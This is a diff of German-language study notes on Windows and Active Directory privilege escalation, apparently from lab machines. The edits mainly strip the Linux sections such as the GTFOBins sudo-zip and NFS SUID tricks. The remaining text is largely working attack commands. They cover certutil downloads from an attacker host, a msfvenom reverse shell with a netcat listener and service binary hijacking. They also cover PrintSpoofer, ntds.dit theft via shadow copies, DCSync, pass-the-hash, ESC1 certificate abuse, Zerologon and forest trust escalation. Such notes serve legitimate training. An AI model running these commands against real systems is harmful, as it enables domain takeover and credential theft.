@@ -1,6 +1,5 @@
 # Windows Privilege Escalation
 
-
 ## Ziel der Phase
 
 - Erlangung höherer Berechtigungen (SYSTEM, Domain Admin, Enterprise Admin)
@@ -15,30 +14,13 @@
 
 **Berechtigungen prüfen:**
 
-cmd
-
 ```cmd
 whoami /priv
-```
-
-**Sudo-Rechte (Linux):**
-
-
-```bash
-sudo -l
-```
-
-**Command History:**
-
-
-```bash
-history
 ```
 
 ### WinPEAS (Windows Privilege Escalation Awesome Scripts)
 
 **HTTP-Server starten (Kali):**
-
 
 ```bash
 python3 -m http.server 80
@@ -46,16 +28,12 @@ python3 -m http.server 80
 
 **Download auf Windows:**
 
-cmd
-
 ```cmd
 cd \users\butler
 certutil.exe -urlcache -f http://<ATTACKER_IP>/winPEASx64.exe winPEASx64.exe
 ```
 
 **Ausführen:**
-
-cmd
 
 ```cmd
 dir
@@ -78,13 +56,11 @@ winPEASx64.exe
 
 1. **Payload erstellen:**
 
-
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=7777 -f exe -o Wise.exe
 ```
 
 2. **HTTP-Server starten:**
-
 
 ```bash
 python3 -m http.server 80
@@ -92,14 +68,11 @@ python3 -m http.server 80
 
 3. **Netcat-Listener:**
 
-
 ```bash
 nc -nvlp 7777
 ```
 
 4. **Service-Manipulation:**
-
-cmd
 
 ```cmd
 cd "C:\Program Files (x86)\Wise\"
@@ -113,36 +86,9 @@ sc start WiseBootAssistant
 
 5. **Verify SYSTEM:**
 
-cmd
-
 ```cmd
 whoami  # NT AUTHORITY\SYSTEM
 ```
-
-### GTFOBins (Linux)
-
-**ZIP Privilege Escalation:**
-
-
-```bash
-# Temporary File Variable
-TF=$(mktemp -u)
-
-# ZIP Privilege Escalation
-sudo zip $TF /etc/hosts -T -TT 'sh #'
-
-# Optional Cleanup
-sudo rm $TF
-
-# Verify
-id
-whoami
-```
-
-**Konzept:**
-
-- sudo zip mit SYSTEM-Rechten
-- -T/-TT flags führen Shell-Command aus
 
 ### PrintSpoofer (SeImpersonatePrivilege)
 
@@ -151,7 +97,6 @@ whoami
 - SeImpersonatePrivilege für aktuellen Prozess
 
 **Exploit:**
-
 
 ```bash
 ./PrintSpoofer.exe -i -c cmd
@@ -176,7 +121,6 @@ whoami
 
 **SetOpLock.exe beschaffen:**
 
-
 ```bash
 git clone https://github.com/p1sc3s/Symlink-Tools-Compiled.git
 cd Symlink-Tools-Compiled
@@ -185,8 +129,6 @@ sudo python3 -m http.server 8000 --bind <ATTACKER_IP>
 ```
 
 **Auf Windows downloaden:**
-
-cmd
 
 ```cmd
 cd C:\Users\Public
@@ -198,8 +140,6 @@ dir SetOpLock.exe
 
 1. **OpLock setzen (Terminal 1):**
 
-cmd
-
 ```cmd
 C:\Users\Public\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
 ```
@@ -207,8 +147,6 @@ C:\Users\Public\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
 **NICHT ENTER DRÜCKEN!**
 
 2. **Repair starten (Terminal 2):**
-
-cmd
 
 ```cmd
 msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
@@ -232,44 +170,9 @@ msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
 
 - Neues CMD mit SYSTEM-Rechten
 
-### NFS Privilege Escalation (UID Spoofing)
-
-**UID ermitteln:**
-
-
-```bash
-id peter.turner@hybrid.vl
-# uid=902601108
-```
-
-**User lokal erstellen:**
-
-
-```bash
-useradd --badname -u 902601108 peter.turner@hybrid.vl
-```
-
-**SUID Bash über NFS:**
-
-
-```bash
-cp /bin/bash /opt/share/
-chmod +s /mnt/tmpmnt/bash
-```
-
-**Privileged Shell:**
-
-
-```bash
-/opt/share/bash -p
-whoami  # peter.turner@hybrid.vl
-```
-
 ### Volume Shadow Copy (SeBackupPrivilege)
 
 **Berechtigungen prüfen:**
-
-cmd
 
 ```cmd
 whoami /priv
@@ -282,8 +185,6 @@ whoami /priv
 
 **Shadow Copy erstellen:**
 
-powershell
-
 ```powershell
 "set context persistent nowriters" | Out-File extract.dsh -Encoding ASCII
 "add volume c: alias baby" | Out-File extract.dsh -Append -Encoding ASCII
@@ -294,16 +195,12 @@ diskshadow /s extract.dsh
 
 **Dateien kopieren:**
 
-cmd
-
 ```cmd
 robocopy z:\windows\ntds C:\Temp ntds.dit /B
 robocopy z:\windows\system32\config C:\Temp system /B
 ```
 
 **Download:**
-
-powershell
 
 ```powershell
 download ntds.dit
@@ -312,13 +209,11 @@ download SYSTEM
 
 **Hash Extraction:**
 
-
 ```bash
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
 **Pass-the-Hash:**
-
 
 ```bash
 evil-winrm -i <TARGET_IP> -u Administrator -H <NT_HASH>
@@ -327,7 +222,6 @@ evil-winrm -i <TARGET_IP> -u Administrator -H <NT_HASH>
 ### Computer Account Takeover
 
 **Passwort ändern:**
-
 
 ```bash
 changepasswd.py retro.vl/banking$:banking@<TARGET_IP> -altuser trainee -altpass trainee -newpass password1@
@@ -342,7 +236,6 @@ changepasswd.py retro.vl/banking$:banking@<TARGET_IP> -altuser trainee -altpass 
 
 **Certificate Templates Enumeration:**
 
-
 ```bash
 certipy-ad find -u 'banking$@retro.vl' -p 'password1@' -dc-ip <TARGET_IP>
 ```
@@ -356,13 +249,11 @@ certipy-ad find -u 'banking$@retro.vl' -p 'password1@' -dc-ip <TARGET_IP>
 
 **Certificate für Administrator anfordern:**
 
-
 ```bash
 certipy-ad req -u 'banking$@retro.vl' -p 'password1@' -ca 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -dns 'dc.retro.vl' -key-size 4096 -dc-ip <TARGET_IP>
 ```
 
 **Authentication mit Certificate:**
-
 
 ```bash
 certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
@@ -375,7 +266,6 @@ certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
 
 **WinRM Login:**
 
-
 ```bash
 evil-winrm -i retro.vl -u 'administrator' -H '<NT_HASH>'
 ```
@@ -384,13 +274,11 @@ evil-winrm -i retro.vl -u 'administrator' -H '<NT_HASH>'
 
 **Vulnerability Check:**
 
-
 ```bash
 nxc smb retro2.vl -M zerologon
 ```
 
 **Exploit herunterladen:**
-
 
 ```bash
 git clone https://github.com/dirkjanm/CVE-2020-1472.git
@@ -398,7 +286,6 @@ cd CVE-2020-1472
 ```
 
 **Exploit ausführen:**
-
 
 ```bash
 python3 cve-2020-1472-exploit.py <NETBIOS_NAME> <TARGET_IP>
@@ -412,13 +299,11 @@ python3 cve-2020-1472-exploit.py <NETBIOS_NAME> <TARGET_IP>
 
 **DCSync Attack:**
 
-
 ```bash
 secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
 ```
 
 **Pass-the-Hash:**
-
 
 ```bash
 psexec.py -hashes :<NT_HASH> Administrator@<TARGET_IP>
@@ -428,13 +313,11 @@ psexec.py -hashes :<NT_HASH> Administrator@<TARGET_IP>
 
 **Credential Extraction:**
 
-
 ```bash
 lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl <TARGET_IP>
 ```
 
 **Domain SID ermitteln:**
-
 
 ```bash
 lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@<TARGET_IP>
@@ -443,7 +326,6 @@ ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://<TARGET_IP> tr
 
 **DNS Setup (Critical!):**
 
-
 ```bash
 echo "<CHILD_DC_IP> lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
 echo "<PARENT_DC_IP> trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
@@ -451,13 +333,11 @@ echo "<PARENT_DC_IP> trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
 
 **Automatische Escalation:**
 
-
 ```bash
 raiseChild.py lab.trusted.vl/cpowers -hashes :<NT_HASH>
 ```
 
 **Parent Domain Compromise:**
-
 
 ```bash
 secretsdump.py -hashes :<ADMIN_HASH> trusted.vl/Administrator@<PARENT_DC_IP>
@@ -468,7 +348,6 @@ evil-winrm -i <PARENT_DC_IP> -u Administrator -H <ADMIN_HASH>
 
 **Keytab zu Hash:**
 
-
 ```bash
 python3 keytabextract.py krb5.keytab
 # NTLM: 0f916c5246fdbc7ba95dcef4126d57bd
@@ -476,20 +355,17 @@ python3 keytabextract.py krb5.keytab
 
 **Certificate Request:**
 
-
 ```bash
 certipy-ad req -u 'MAIL01$' -hashes :<NTLM_HASH> -ca hybrid-DC01-CA -target <TARGET_IP> -template HybridComputers -upn administrator@hybrid.vl -key-size 4096
 ```
 
 **Password Reset via Certificate:**
 
-
 ```bash
 python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip <TARGET_IP> -target administrator -new-pass Password123!
 ```
 
 **Domain Admin:**
-
 
 ```bash
 evil-winrm -i <TARGET_IP> -u administrator -p 'Password123!'
@@ -585,11 +461,6 @@ evil-winrm -i <TARGET_IP> -u administrator -p 'Password123!'
 - PrintSpoofer
 - Potato-Exploits
 
-**sudo zip (Linux):**
-
-- GTFOBins
-- Shell-Command Execution
-
 ### Active Directory
 
 **Computer Account Takeover:**
@@ -614,20 +485,11 @@ evil-winrm -i <TARGET_IP> -u administrator -p 'Password123!'
 - Trust-Key-Extraktion
 - SID-History
 
-### NFS-Misconfigurations
-
-**UID Spoofing:**
-
-- World-readable/writable Exports
-- SUID Binary Creation möglich
-
 ---
 
 ## Wichtige Befehle & Syntax
 
 ### Service Control
-
-cmd
 
 ```cmd
 sc query <SERVICE>
@@ -635,18 +497,7 @@ sc stop <SERVICE>
 sc start <SERVICE>
 ```
 
-### GTFOBins ZIP
-
-
-```bash
-TF=$(mktemp -u)
-sudo zip $TF /etc/hosts -T -TT 'sh #'
-sudo rm $TF
-```
-
 ### Volume Shadow Copy
-
-powershell
 
 ```powershell
 diskshadow /s extract.dsh
@@ -654,7 +505,6 @@ robocopy <SOURCE> <DEST> <FILE> /B
 ```
 
 ### Certipy ESC1
-
 
 ```bash
 certipy-ad find -u <USER> -p <PASS> -dc-ip <IP>
@@ -664,7 +514,6 @@ certipy-ad auth -pfx <PFX_FILE> -dc-ip <IP>
 
 ### Zerologon
 
-
 ```bash
 python3 cve-2020-1472-exploit.py <NETBIOS_NAME> <TARGET_IP>
 secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
@@ -672,15 +521,13 @@ secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
 
 ### raiseChild.py
 
-
 ```bash
 raiseChild.py <CHILD_DOMAIN>/<USER> -hashes :<NT_HASH>
 ```
 
 ### Pass-the-Cert
 
-
-````bash
+```bash
 python3 passthecert.py -action modify_user -crt <CRT> -key <KEY> -domain <DOMAIN> -dc-ip <IP> -target <USER> -new-pass <PASS>
 ```
 
@@ -699,13 +546,6 @@ python3 passthecert.py -action modify_user -crt <CRT> -key <KEY> -domain <DOMAIN
 7. **Binary ersetzen** → copy
 8. **Service starten** → sc start
 9. **Verify SYSTEM** → whoami
-
-### GTFOBins Flow (Linux)
-
-1. **sudo -l prüfen** → Verfügbare Befehle
-2. **GTFOBins recherchieren** → sudo-Section
-3. **Exploit ausführen** → TF=$(mktemp -u); sudo zip...
-4. **Verify root** → id, whoami
 
 ### Volume Shadow Copy Flow
 
@@ -771,14 +611,6 @@ Tool: WinPEAS
 Vulnerability: WiseBootAssistant (Unquoted Service Path)
 Payload: Wise.exe → BootTime.exe
 Result: NT AUTHORITY\SYSTEM
-```
-
-**Dev VM (GTFOBins ZIP):**
-```
-User: jeanpaul
-sudo -l: /usr/bin/zip
-Method: GTFOBins ZIP Exploit
-Result: root
 ```
 
 **Baby VM (Volume Shadow Copy):**
@@ -855,10 +687,6 @@ Result: NT AUTHORITY\SYSTEM
 - Zu schnell ausgewertet → Red/Yellow-Findings prüfen
 - Unbekannte Vulnerability → Manual Enumeration nötig
 
-**GTFOBins ZIP:**
-- sudo -l nicht ausgeführt → Verfügbare Befehle unbekannt
-- Syntax-Fehler → Exakt GTFOBins-Syntax verwenden
-
 **Volume Shadow Copy:**
 - SeBackupPrivilege fehlt → Alternative Methode nötig
 - robocopy ohne /B → Zugriff verweigert
@@ -907,7 +735,7 @@ HybridComputers:
 - Client Authentication: Enabled
 - Enrollee Supplies Subject: True
 - Enrollment Rights: Domain Computers
-````
+```
 
 ### Privilege Findings
 
@@ -920,8 +748,3 @@ HybridComputers:
 
 - PrintSpoofer
 - JuicyPotato (ältere Windows-Versionen)
-
-**sudo zip (Linux):**
-
-- GTFOBins Exploit
-- Shell as root
